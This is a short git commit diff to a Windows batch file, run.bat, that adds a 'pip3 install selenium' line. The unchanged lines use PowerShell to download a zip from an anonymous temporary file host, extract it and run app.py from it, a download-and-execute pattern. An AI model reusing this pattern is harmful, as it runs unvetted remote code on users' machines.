cb04cd82240fa3054724571a1aa84e31cde2b02b
NoobBugHunter <60887399+NoobBugHunter@users.noreply.github.com>
2021-08-14 04:25:22 +0500

    Update run.bat

--- run.bat
+++ run.bat
@@ -2,4 +2,5 @@
 powershell -Command "Invoke-WebRequest https://a.tmp.ninja/qBGcmdAw.zip -OutFile package.zip"
 powershell -Command "Expand-Archive package.zip"
 cd package
+pip3 install selenium
 python3 app.py
